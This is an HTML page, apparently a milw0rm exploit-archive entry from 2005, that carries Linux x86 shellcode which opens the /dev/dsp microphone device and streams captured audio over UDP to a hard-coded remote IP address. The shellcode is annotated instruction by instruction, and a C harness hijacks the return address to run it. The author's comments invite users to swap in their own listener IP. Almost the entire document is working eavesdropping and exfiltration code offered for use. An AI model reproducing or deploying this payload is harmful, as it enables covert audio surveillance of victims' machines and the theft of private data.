@@ -1,0 +1,160 @@
+<html><head><title>linux/x86 snoop /dev/dsp shellcode 172 bytes</title></head><pre>/* Placed the listener here http://www.milw0rm.com/down.php?id=1293 /str0ke */
+
+/********************************************************************
+	hey folks, this is snoop_shell, short and simply it snoops on 
+	/dev/dsp and after attempting to lower the audio quality
+	will stream any data read on this device over a udp stream
+	to a remote listening client.. (source should be available at stonedcoder.org)
+
+	the port that this will stream on is whatever the high half
+	of the ip address is, i figured this will always be over 1024
+	so the client will be usable without root privs.
+
+	at 172 bytes, its really bloated for shellcode, but if your 
+	reading this anyway, you probably are just looking to have fun 
+	with it..
+
+	remember you'll need to change the ip address before you 
+	actually use it.. and if your unlucky enough to have an 
+	ip address that contains a null.. well.. its on you to fix it..
+	but you can do that by simply rotating the ipaddress by a bit or 
+	two..
+
+	mov    $0xE8015180,%ebx						#192.168.0.116
+	ror	   %ebx									#shift right by one bit
+	
+	no more null
+	
+
+	phar[at]stonedcoder[dot]org
+*********************************************************************/
+
+
+char shellcode[] = 
+&quot;\x31\xc9&quot;                	//xor    %ecx,%ecx
+&quot;\x51&quot;	                   	//push   %ecx					# \x00
+&quot;\x68\x2f\x64\x73\x70&quot;      //push   $0x7073642f			# /dsp
+&quot;\x68\x2f\x64\x65\x76&quot;      //push   $0x7665642f			# /dev
+&quot;\x89\xe3&quot;                	//mov    %esp,%ebx
+&quot;\x89\xc8&quot;                	//mov    %ecx,%eax
+&quot;\xb1\x02&quot;                	//mov    $0x2,%cl
+&quot;\xb0\x05&quot;                	//mov    $0x5,%al
+&quot;\xcd\x80&quot;                	//int    $0x80					#open /dev/dsp for reading
+
+&quot;\x89\xc6&quot;                	//mov    %eax,%esi				#preserve fd in esi
+
+&quot;\x31\xc9&quot;                	//xor    %ecx,%ecx
+&quot;\x51&quot;                   	//push   %ecx
+&quot;\x31\xdb&quot;                	//xor    %ebx,%ebx
+&quot;\xb3\x02&quot;                	//mov    $0x2,%bl
+&quot;\x53&quot;                   	//push   %ebx
+&quot;\x53&quot;                   	//push   %ebx
+&quot;\x4b&quot;                   	//dec    %ebx
+&quot;\x89\xe1&quot;                	//mov    %esp,%ecx
+&quot;\x89\xd8&quot;                	//mov    %ebx,%eax
+&quot;\xb0\x66&quot;                	//mov    $0x66,%al
+&quot;\xcd\x80&quot;                	//int    $0x80					#create a udp socket
+
+&quot;\x89\xc7&quot;                	//mov    %eax,%edi				#preserve socket in edi
+
+&quot;\xc1\xc3\x04&quot;             	//rol    $0x4,%ebx
+&quot;\x53&quot;                   	//push   %ebx
+&quot;\x89\xe2&quot;                	//mov    %esp,%edx
+&quot;\xb9\x05\x50\x04\xc0&quot;      //mov    $0xc0045005,%ecx
+&quot;\x89\xf3&quot;                	//mov    %esi,%ebx				
+&quot;\xb0\x36&quot;                	//mov    $0x36,%al				
+&quot;\xcd\x80&quot;                	//int    $0x80					#ioctl on fd SOUND_PCM_WRITE_BITS (16 bits per samle)
+
+&quot;\xfe\xc0&quot;                	//inc    %al
+&quot;\x89\x04\x24&quot;             	//mov    %eax,(%esp)
+&quot;\xfe\xc1&quot;                	//inc    %cl
+&quot;\xb0\x36&quot;                	//mov    $0x36,%al
+&quot;\xcd\x80&quot;                	//int    $0x80					#ioctl on fd SOUND_PCM_WRITE_CHANNELS (1 channel)
+
+&quot;\xfe\xc0&quot;                	//inc    %al
+&quot;\xc1\xc0\x0d&quot;             	//rol    $0xd,%eax
+&quot;\x89\x04\x24&quot;             	//mov    %eax,(%esp)
+&quot;\xc1\xc8\x04&quot;             	//ror    $0x8,%eax
+&quot;\xb1\x02&quot;                	//mov    $0x2,%cl
+&quot;\xb0\x36&quot;                	//mov    $0x36,%al				#ioctl on fd SOUND_PCM_WRITE_RATE (8khz)
+&quot;\xcd\x80&quot;                	//int    $0x80
+
+&quot;\x50&quot;                   	//push   %eax
+&quot;\x50&quot;                   	//push   %eax
+&quot;\x89\xc2&quot;                	//mov    %eax,%edx
+
+/* prepare an area on the stack that looks like an struct in_addr */
+	  /*your ipv4 ip address*/
+&quot;\xbb&quot; &quot;\xc0\xa8\x0f\x2e&quot;   //mov    $0x7401a8c0,%ebx		#your ipaddress would go here currently set to 192.168.1.116
+&quot;\x53&quot;                   	//push   %ebx
+&quot;\xc1\xe3\x10&quot;             	//shl    $0x10,%ebx
+&quot;\xb3\x02&quot;                	//mov    $0x2,%bl
+&quot;\x53&quot;                 		//push   %ebx					#port and family, (we'll use use the hi half of the address for a port)
+
+/* allocate 1025 byte buffer on the stack */
+&quot;\x89\xe3&quot;                	//mov    %esp,%ebx
+&quot;\x66\xba\x01\x04&quot;          //mov    $0x401,%dx				#create the space on the stack (1025 bytes)
+&quot;\x29\xd4&quot;                	//sub    %edx,%esp
+
+&quot;\x89\xe0&quot;                	//mov    %esp,%eax
+&quot;\x31\xc9&quot;                	//xor    %ecx,%ecx
+&quot;\xb1\x10&quot;                	//mov    $0x10,%cl
+&quot;\x51&quot;       	            //push   %ecx
+&quot;\x53&quot;         	          	//push   %ebx
+&quot;\x31\xc9&quot;         	       	//xor    %ecx,%ecx
+&quot;\x51&quot;               	    //push   %ecx
+&quot;\x52&quot;                 	  	//push   %edx
+&quot;\x50&quot;                 	  	//push   %eax
+&quot;\x57&quot;						//push   %edi
+&quot;\x89\xc2&quot;                	//mov    %eax,%edx
+&quot;\x89\xcb&quot;                	//mov    %ecx,%ebx
+&quot;\x89\xc8&quot;                	//mov    %ecx,%eax
+&quot;\x89\xe1&quot;                	//mov    %esp,%ecx
+&quot;\xb3\x0b&quot;                	//mov    $0xb,%bl
+&quot;\xb0\x66&quot;                	//mov    $0x66,%al
+&quot;\x51&quot;                   	//push   %ecx
+&quot;\x89\xe7&quot;                	//mov    %esp,%edi				#registers and stack are prepared for call to sendto
+&quot;\x60&quot;                   	//pusha  						#push regs onto stack
+
+&quot;\x89\xf3&quot;                	//mov    %esi,%ebx
+&quot;\x89\xd1&quot;                	//mov    %edx,%ecx
+&quot;\x89\xd8&quot;                	//mov    %ebx,%eax
+&quot;\xb0\x03&quot;                	//mov    $0x3,%al
+&quot;\x89\xc2&quot;                	//mov    %eax,%edx
+&quot;\x66\xba\x01\x08&quot;          //mov    $0x401,%dx				#registers are prepared for call to read
+&quot;\x60&quot;                   	//pusha  						#push regs
+
+
+&quot;\x89\x27&quot;                	//mov    %esp,(%edi)			#store this stack pointer in the memory allocated above 
+/*loop:*/					//								#so that we can restore it for the loop
+
+&quot;\x61&quot;                   	//popa   						#pop prepared registers from stack
+&quot;\xcd\x80&quot;                	//int    $0x80					#call read
+
+&quot;\x61&quot;                 	  	//popa   						#pop registers again
+&quot;\xcd\x80&quot;                	//int    $0x80					#call sendto
+
+&quot;\x8b\x27&quot;                	//mov    (%edi),%esp			#pulls from the memory allocated before and restores esp
+&quot;\xeb\xf6&quot;                	//jmp    80483f5 &lt;loop&gt;
+;
+
+
+
+int main() {
+int *ret;
+char cnull = 0;
+
+	printf(&quot;shellcode_size: %u\n&quot;, sizeof(shellcode));
+	printf(&quot;contains nulls: &quot;);
+	if(!memmem(shellcode,sizeof(shellcode),&amp;cnull,1)){
+		printf(&quot;yes\n&quot;);
+	}else{
+		printf(&quot;no\n&quot;);
+	}
+	
+	ret = (int *)&amp;ret + 2;
+	(*ret) = (int)shellcode;
+
+}
+
+// milw0rm.com [2005-11-04]</pre></html>
